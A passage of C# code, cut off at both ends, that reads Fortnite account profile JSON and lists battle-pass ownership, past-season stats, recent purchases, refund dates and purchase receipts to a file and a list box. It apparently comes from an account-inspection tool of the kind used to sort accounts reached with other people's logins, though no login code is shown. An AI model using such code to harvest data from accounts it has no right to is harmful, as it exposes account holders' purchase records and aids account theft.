                                        FnBattleRoyalLB.Items.Add("Had Season 4 BattlePass ---> Yes");
                                    }
                                    bool flagtrue3 = x.Contains("AthenaCharacter:cid_116_athena_commando_m_carbideblack");
                                    if (flagtrue3)
                                    {
                                        sw.WriteLine("Completed Season 4 BattlePass ---> " + "Yes");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed Season 4 BattlePass ---> " + "Yes");
                                        }
                                    }
                                    else if (flagtrue3 == false)
                                    {
                                        sw.WriteLine("Completed Season 4 BattlePass ---> " + "No");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed Season 4 BattlePass ---> " + "No");
                                        }
                                    }
                                }
                                else if (flag159 == false)
                                {
                                    sw.WriteLine("Had Season 4 BattlePass ---> No");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Season 4 BattlePass ---> No");
                                    }
                                }
                                bool flag160 = x.Contains("AthenaCharacter:cid_163_athena_commando_f_viking");
                                if (flag160 == true)
                                {
                                    sw.WriteLine("Had Season 5 BattlePass ---> Yes");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Had Season 5 BattlePass (Season 5) ---> Yes");
                                    }
                                    bool flagtrue4 = x.Contains("AthenaCharacter:cid_165_athena_commando_m_darkviking");
                                    if (flagtrue4)
                                    {
                                        sw.WriteLine("Completed Season 5 BattlePass ---> " + "Yes");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed Season 5 BattlePass ---> " + "Yes");
                                        }
                                    }
                                    else if (flagtrue4 == false)
                                    {
                                        sw.WriteLine("Completed Season 5 BattlePass ---> " + "No");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed Season 5 BattlePass ---> " + "No");
                                        }
                                    }
                                }
                                else if (flag160 == false)
                                {
                                    sw.WriteLine("Had Season 5 BattlePass ---> No");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Had Season 5 BattlePass ---> No");
                                    }
                                }
                                bool flag161 = x.Contains("AthenaCharacter:cid_233_athena_commando_m_fortnitedj");
                                if (flag161 == true)
                                {
                                    sw.WriteLine("Had Season 6 BattlePass ---> Yes");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Had Season 5 BattlePass (Season 6) ---> Yes");
                                    }
                                    bool flagtrue5 = x.Contains("AthenaCharacter:cid_230_athena_commando_m_werewolf");
                                    if (flagtrue5)
                                    {
                                        sw.WriteLine("Completed Season 6 BattlePass ---> " + "Yes");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed Season 6 BattlePass ---> " + "Yes");
                                        }
                                    }
                                    else if (flagtrue5 == false)
                                    {
                                        sw.WriteLine("Completed Season 6 BattlePass ---> " + "No");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed Season 6 BattlePass ---> " + "No");
                                        }
                                    }
                                }
                                else if (flag161 == false)
                                {
                                    sw.WriteLine("Has Current Battlepass (Season 6) ---> No");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Current Battlepass (Season 6) ---> No");
                                    }
                                }
                                bool flag162 = x.Contains("AthenaCharacter:cid_287_athena_commando_m_arcticsniper");
                                if (flag162 == true)
                                {
                                    sw.WriteLine("Has Current Battlepass (Season 7) ---> Yes");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Current Battlepass (Season 7) ---> Yes");
                                    }
                                    bool flagtrue6 = x.Contains("AthenaCharacter:cid_288_athena_commando_m_iceking");
                                    if (flagtrue6)
                                    {
                                        sw.WriteLine("Completed Season 7 BattlePass ---> " + "Yes");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed Season 7 BattlePass ---> " + "Yes");
                                        }
                                    }
                                    else if (flagtrue6 == false)
                                    {
                                        sw.WriteLine("Completed Season 7 BattlePass ---> " + "No");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed Season 7 BattlePass ---> " + "No");
                                        }
                                    }
                                }
                                else if (flag162 == false)
                                {
                                    sw.WriteLine("Has Current Battlepass (Season 7) ---> No");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Current Battlepass (Season 7) ---> No");
                                    }
                                }
                            }
                        }
                        if (CheckForPastSeasonInformation.Checked)
                        {
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("----------------------<Past Season Info>------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("----------------------<Past Season Info>------------------------");
                            }
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            JToken profile = JObject.Parse(x)["profileChanges"][0]["profile"];
                            try
                            {
                                string S2number = (profile["stats"]["attributes"]["past_seasons"][0]["seasonNumber"].ToString());
                                string S2Wins = (profile["stats"]["attributes"]["past_seasons"][0]["numWins"].ToString());
                                string S2XP = (profile["stats"]["attributes"]["past_seasons"][0]["seasonXp"].ToString());
                                string S2SeasonLevel = (profile["stats"]["attributes"]["past_seasons"][0]["seasonLevel"].ToString());
                                string S2HadBattlepass = (profile["stats"]["attributes"]["past_seasons"][0]["purchasedVIP"].ToString());
                                sw.WriteLine("Season #" + S2number);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season #" + S2number);
                                }
                                sw.WriteLine("Season Wins: " + S2Wins);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season Wins: " + S2Wins);
                                }
                                sw.WriteLine("Season XP: " + S2XP);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season XP: " + S2XP);
                                }
                                sw.WriteLine("Season Final Level: " + S2SeasonLevel);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season Final Level: " + S2SeasonLevel);
                                }
                                sw.WriteLine("Had BattlePass: " + S2HadBattlepass);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Had BattlePass: " + S2HadBattlepass);
                                }
                                if (S2HadBattlepass == "True")
                                {
                                    string S2BattlePassLevel = (profile["stats"]["attributes"]["past_seasons"][0]["bookLevel"].ToString());
                                    sw.WriteLine("Battlepass Level: " + S2BattlePassLevel);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Battlepass Level: " + S2BattlePassLevel);
                                    }
                                }
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                            }
                            catch
                            {

                            }
                            try
                            {
                                string S3number = (profile["stats"]["attributes"]["past_seasons"][1]["seasonNumber"].ToString());
                                string S3Wins = (profile["stats"]["attributes"]["past_seasons"][1]["numWins"].ToString());
                                string S3XP = (profile["stats"]["attributes"]["past_seasons"][1]["seasonXp"].ToString());
                                string S3SeasonLevel = (profile["stats"]["attributes"]["past_seasons"][1]["seasonLevel"].ToString());
                                string S3HadBattlepass = (profile["stats"]["attributes"]["past_seasons"][1]["purchasedVIP"].ToString());
                                sw.WriteLine("Season #" + S3number);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season #" + S3number);
                                }
                                sw.WriteLine("Season Wins: " + S3Wins);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season Wins: " + S3Wins);
                                }
                                sw.WriteLine("Season XP: " + S3XP);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season XP: " + S3XP);
                                }
                                sw.WriteLine("Season Final Level: " + S3SeasonLevel);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season Final Level: " + S3SeasonLevel);
                                }
                                sw.WriteLine("Had BattlePass: " + S3HadBattlepass);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Had BattlePass: " + S3HadBattlepass);
                                }
                                if (S3HadBattlepass == "True")
                                {
                                    string S3BattlePassLevel = (profile["stats"]["attributes"]["past_seasons"][1]["bookLevel"].ToString());
                                    sw.WriteLine("Battlepass Level: " + S3BattlePassLevel);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Battlepass Level: " + S3BattlePassLevel);
                                    }
                                }
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                            }
                            catch
                            {

                            }
                            try
                            {
                                string S4number = (profile["stats"]["attributes"]["past_seasons"][2]["seasonNumber"].ToString());
                                string S4Wins = (profile["stats"]["attributes"]["past_seasons"][2]["numWins"].ToString());
                                string S4XP = (profile["stats"]["attributes"]["past_seasons"][2]["seasonXp"].ToString());
                                string S4SeasonLevel = (profile["stats"]["attributes"]["past_seasons"][2]["seasonLevel"].ToString());
                                string S4HadBattlepass = (profile["stats"]["attributes"]["past_seasons"][2]["purchasedVIP"].ToString());
                                sw.WriteLine("Season #" + S4number);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season #" + S4number);
                                }
                                sw.WriteLine("Season Wins: " + S4Wins);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season Wins: " + S4Wins);
                                }
                                sw.WriteLine("Season XP: " + S4XP);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season XP: " + S4XP);
                                }
                                sw.WriteLine("Season Final Level: " + S4SeasonLevel);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season Final Level: " + S4SeasonLevel);
                                }
                                sw.WriteLine("Had BattlePass: " + S4HadBattlepass);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Had BattlePass: " + S4HadBattlepass);
                                }
                                if (S4HadBattlepass == "True")
                                {
                                    string S4BattlePassLevel = (profile["stats"]["attributes"]["past_seasons"][2]["bookLevel"].ToString());
                                    sw.WriteLine("Battlepass Level: " + S4BattlePassLevel);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Battlepass Level: " + S4BattlePassLevel);
                                    }
                                }
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                            }
                            catch
                            {

                            }
                            try
                            {
                                string S5number = (profile["stats"]["attributes"]["past_seasons"][3]["seasonNumber"].ToString());
                                string S5Wins = (profile["stats"]["attributes"]["past_seasons"][3]["numWins"].ToString());
                                string S5XP = (profile["stats"]["attributes"]["past_seasons"][3]["seasonXp"].ToString());
                                string S5SeasonLevel = (profile["stats"]["attributes"]["past_seasons"][3]["seasonLevel"].ToString());
                                string S5HadBattlepass = (profile["stats"]["attributes"]["past_seasons"][3]["purchasedVIP"].ToString());
                                sw.WriteLine("Season #" + S5number);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season #" + S5number);
                                }
                                sw.WriteLine("Season Wins: " + S5Wins);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season Wins: " + S5Wins);
                                }
                                sw.WriteLine("Season XP: " + S5XP);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season XP: " + S5XP);
                                }
                                sw.WriteLine("Season Final Level: " + S5SeasonLevel);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season Final Level: " + S5SeasonLevel);
                                }
                                sw.WriteLine("Had BattlePass: " + S5HadBattlepass);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Had BattlePass: " + S5HadBattlepass);
                                }
                                if (S5HadBattlepass == "True")
                                {
                                    string S5BattlePassLevel = (profile["stats"]["attributes"]["past_seasons"][3]["bookLevel"].ToString());
                                    sw.WriteLine("Battlepass Level: " + S5BattlePassLevel);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Battlepass Level: " + S5BattlePassLevel);
                                    }
                                }
                            }
                            catch
                            { }
                            try
                            {
                                string S6number = (profile["stats"]["attributes"]["past_seasons"][4]["seasonNumber"].ToString());
                                string S6Wins = (profile["stats"]["attributes"]["past_seasons"][4]["numWins"].ToString());
                                string S6XP = (profile["stats"]["attributes"]["past_seasons"][4]["seasonXp"].ToString());
                                string S6SeasonLevel = (profile["stats"]["attributes"]["past_seasons"][4]["seasonLevel"].ToString());
                                string S6HadBattlepass = (profile["stats"]["attributes"]["past_seasons"][4]["purchasedVIP"].ToString());
                                sw.WriteLine("Season #" + S6number);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season #" + S6number);
                                }
                                sw.WriteLine("Season Wins: " + S6Wins);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season Wins: " + S6Wins);
                                }
                                sw.WriteLine("Season XP: " + S6XP);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season XP: " + S6XP);
                                }
                                sw.WriteLine("Season Final Level: " + S6SeasonLevel);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season Final Level: " + S6SeasonLevel);
                                }
                                sw.WriteLine("Had BattlePass: " + S6HadBattlepass);
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Had BattlePass: " + S6HadBattlepass);
                                }
                                if (S6HadBattlepass == "True")
                                {
                                    string S6BattlePassLevel = (profile["stats"]["attributes"]["past_seasons"][4]["bookLevel"].ToString());
                                    sw.WriteLine("Battlepass Level: " + S6BattlePassLevel);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Battlepass Level: " + S6BattlePassLevel);
                                    }
                                }
                            }
                            catch
                            { }
                        }
                        if (CeckForLast5Purchases.Checked)
                        {
                            if (c.Contains("purchases") && c.Contains("lootResult"))
                            {
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("----------------------<Last 5 Purchases>------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("----------------------<Last 5 Purchases>------------------------");
                                }
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                JToken PurchaseJson = JObject.Parse(c)["profileChanges"][0]["profile"];
                                // START First Pirchase History //
                                sw.WriteLine("Purchase #1");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Purchase #1");
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                try
                                {
                                    string PurchaseID1 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][0]["purchaseId"].ToString());
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase ID: " + PurchaseID1);

                                    }
                                    sw.WriteLine("Purchase ID: " + PurchaseID1);
                                }
                                catch { }
                                try
                                {
                                    string PurchaseDate1 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][0]["purchaseDate"].ToString());
                                    sw.WriteLine("Purchase Date: " + PurchaseDate1);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase Date: " + PurchaseDate1);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string WasRefunded1 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][0]["refundDate"].ToString());
                                    sw.WriteLine("Refund Date " + WasRefunded1);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Refund Date: " + WasRefunded1);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string ItemType1 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][0]["lootResult"][0]["itemType"].ToString());
                                    sw.WriteLine("Purchase Type: " + ItemType1);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase Type: " + ItemType1);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string AmountPaid1 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][0]["totalMtxPaid"].ToString());
                                    sw.WriteLine("Amount Paid: " + AmountPaid1);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Amount Paid: " + AmountPaid1);
                                    }
                                }
                                catch { }
                                // END First Pirchase History //
                                // START SECOND Pirchase History //
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                sw.WriteLine("Purchase #2");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Purchase #2");
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                try
                                {
                                    string PurchaseID2 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][1]["purchaseId"].ToString());
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase ID: " + PurchaseID2);
                                    }
                                    sw.WriteLine("Purchase ID: " + PurchaseID2);
                                }
                                catch { }
                                try
                                {
                                    string PurchaseDate2 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][1]["purchaseDate"].ToString());
                                    sw.WriteLine("Purchase Date: " + PurchaseDate2);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase Date: " + PurchaseDate2);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string WasRefunded2 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][1]["refundDate"].ToString());
                                    sw.WriteLine("Refund Date " + WasRefunded2);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Refund Date: " + WasRefunded2);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string ItemType2 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][1]["lootResult"][0]["itemType"].ToString());
                                    sw.WriteLine("Purchase Type: " + ItemType2);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase Type: " + ItemType2);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string AmountPaid2 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][1]["totalMtxPaid"].ToString());
                                    sw.WriteLine("Amount Paid: " + AmountPaid2);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Amount Paid: " + AmountPaid2);
                                    }
                                }
                                catch { }
                                // END SECOND Pirchase History //
                                // START THIRD Pirchase History //
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                sw.WriteLine("Purchase #3");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Purchase #3");
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                try
                                {
                                    string PurchaseID3 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][2]["purchaseId"].ToString());
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase ID: " + PurchaseID3);
                                    }
                                    sw.WriteLine("Purchase ID: " + PurchaseID3);
                                }
                                catch { }
                                try
                                {
                                    string PurchaseDate3 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][2]["purchaseDate"].ToString());
                                    sw.WriteLine("Purchase Date: " + PurchaseDate3);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase Date: " + PurchaseDate3);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string WasRefunded3 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][2]["refundDate"].ToString());
                                    sw.WriteLine("Refund Date " + WasRefunded3);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Refund Date: " + WasRefunded3);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string ItemType3 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][2]["lootResult"][0]["itemType"].ToString());
                                    sw.WriteLine("Purchase Type: " + ItemType3);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase Type: " + ItemType3);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string AmountPaid3 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][2]["totalMtxPaid"].ToString());
                                    sw.WriteLine("Amount Paid: " + AmountPaid3);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Amount Paid: " + AmountPaid3);
                                    }
                                }
                                catch { }
                                // END THIRD Pirchase History //
                                // START FOURTH Pirchase History //
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                sw.WriteLine("Purchase #4");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Purchase #4");
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                try
                                {
                                    string PurchaseID4 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][3]["purchaseId"].ToString());
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase ID: " + PurchaseID4);
                                    }
                                    sw.WriteLine("Purchase ID: " + PurchaseID4);
                                }
                                catch { }
                                try
                                {
                                    string PurchaseDate4 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][3]["purchaseDate"].ToString());
                                    sw.WriteLine("Purchase Date: " + PurchaseDate4);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase Date: " + PurchaseDate4);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string WasRefunded4 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][3]["refundDate"].ToString());
                                    sw.WriteLine("Refund Date " + WasRefunded4);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Refund Date: " + WasRefunded4);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string ItemType4 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][3]["lootResult"][0]["itemType"].ToString());
                                    sw.WriteLine("Purchase Type: " + ItemType4);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase Type: " + ItemType4);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string AmountPaid4 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][3]["totalMtxPaid"].ToString());
                                    sw.WriteLine("Amount Paid: " + AmountPaid4);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Amount Paid: " + AmountPaid4);
                                    }
                                }
                                catch { }
                                // END FOURTH Pirchase History //

                                // START FIFTH Pirchase History //
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                sw.WriteLine("Purchase #5");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Purchase #5");
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                try
                                {
                                    string PurchaseID5 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][4]["purchaseId"].ToString());
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase ID: " + PurchaseID5);
                                    }
                                    sw.WriteLine("Purchase ID: " + PurchaseID5);
                                }
                                catch { }
                                try
                                {
                                    string PurchaseDate5 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][4]["purchaseDate"].ToString());
                                    sw.WriteLine("Purchase Date: " + PurchaseDate5);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase Date: " + PurchaseDate5);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string WasRefunded5 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][4]["refundDate"].ToString());
                                    sw.WriteLine("Refund Date " + WasRefunded5);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Refund Date: " + WasRefunded5);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string ItemType5 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][4]["lootResult"][0]["itemType"].ToString());
                                    sw.WriteLine("Purchase Type: " + ItemType5);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase Type: " + ItemType5);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string AmountPaid5 = (PurchaseJson["stats"]["attributes"]["mtx_purchase_history"]["purchases"][4]["totalMtxPaid"].ToString());
                                    sw.WriteLine("Amount Paid: " + AmountPaid5);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Amount Paid: " + AmountPaid5);
                                    }
                                }
                                catch { }
                                // END FIFTH Pirchase History //
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                sw.WriteLine("Other Purchase Information");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Other Purchase Information");
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                //Random Other information
                                try
                                {
                                    string purchase1 = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["receipts"][0].ToString());
                                    sw.WriteLine("Purchase #1 --> " + purchase1);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase #1 --> " + purchase1);
                                    }
                                }
                                catch
                                {
                                }
                                try
                                {
                                    string purchase2 = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["receipts"][1].ToString());
                                    sw.WriteLine("Purchase #2 --> " + purchase2);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase #2 --> " + purchase2);
                                    }
                                }
                                catch
                                {
                                }
                                try
                                {
                                    string purchase3 = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["receipts"][2].ToString());
                                    sw.WriteLine("Purchase #3 --> " + purchase3);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase #3 --> " + purchase3);
                                    }
                                }
                                catch
                                {
                                }
                                try
                                {
                                    string purchase4 = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["receipts"][3].ToString());
                                    sw.WriteLine("Purchase #4 --> " + purchase4);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase #4 --> " + purchase4);
                                    }
                                }
                                catch
                                {
                                }
                                try
                                {
                                    string purchase5 = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["receipts"][4].ToString());
                                    sw.WriteLine("Purchase #5 --> " + purchase5);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase #5 --> " + purchase5);
                                    }
                                }
                                catch
                                {
                                }

                                try
                                {
                                    string purchase6 = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["receipts"][5].ToString());
                                    sw.WriteLine("Purchase #6 --> " + purchase6);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase #6 --> " + purchase6);
                                    }
                                }
                                catch
                                {
                                }

                                try
                                {
                                    string purchase7 = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["receipts"][6].ToString());
                                    sw.WriteLine("Purchase #7 --> " + purchase7);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase #7 --> " + purchase7);
                                    }
                                }
                                catch
                                {
                                }

                                try
                                {
